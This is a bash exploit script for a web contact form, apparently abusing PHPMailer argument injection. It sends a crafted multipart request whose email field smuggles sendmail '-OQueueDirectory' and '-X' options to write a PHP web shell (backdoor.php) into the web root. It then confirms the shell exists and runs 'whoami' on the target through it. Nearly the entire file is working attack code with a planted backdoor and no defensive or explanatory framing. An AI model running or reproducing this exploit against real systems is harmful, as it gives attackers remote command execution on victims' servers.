#!/bin/bash

echo -e "\e[31mThis may take up to 5 minutes\e[0m"

if [ -z "$1" ]
then
    echo 'Please inform a host as parameter'
    exit -1
fi

if [ $(uname) == 'Darwin' ]
then
    decoder='base64 -D'
elif [ $(uname) == 'Linux' ]
then
    decoder='base64 -d'  
else
    echo '[-] Your platform isnt supported: '$(uname)
    exit -1
fi


host=$1

echo 'Exploiting '$host

curl -sq 'http://'$host -H 'Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryzXJpHSq4mNy35tHe' --data-binary $'------WebKitFormBoundaryzXJpHSq4mNy35tHe\r\nContent-Disposition: form-data; name="action"\r\n\r\nsubmit\r\n------WebKitFormBoundaryzXJpHSq4mNy35tHe\r\nContent-Disposition: form-data; name="name"\r\n\r\n<?php echo "|".base64_encode(system(base64_decode($_GET["cmd"])))."|"; ?>\r\n------WebKitFormBoundaryzXJpHSq4mNy35tHe\r\nContent-Disposition: form-data; name="email"\r\n\r\n\"vulnerables\\\" -OQueueDirectory=/tmp -X/www/backdoor.php server\" @test.com\r\n------WebKitFormBoundaryzXJpHSq4mNy35tHe\r\nContent-Disposition: form-data; name="message"\r\n\r\nPwned\r\n------WebKitFormBoundaryzXJpHSq4mNy35tHe--\r\n' >/dev/null && echo 'Target exploited, acessing shell at http://'$host'/backdoor.php'


echo 'Checking if the backdoor was created on target system'
code=$(curl -o /dev/null --silent --head --write-out '%{http_code}\n' "http://$host/backdoor.php")

if [ "$code" != "200" ]
then
    echo 'Target cant be exploited'
    exit -1
else
    echo 'Backdoor.php found on remote system'
fi

cmd='whoami'

    echo 'Running '$cmd
curl -sq http://$host/backdoor.php?cmd=$(echo -ne $cmd | base64) | grep '|' | grep -v 'base64_encode' | head -n 1 | cut -d '|' -f 2 | $decoder 
 echo ""
echo 'Exiting....'
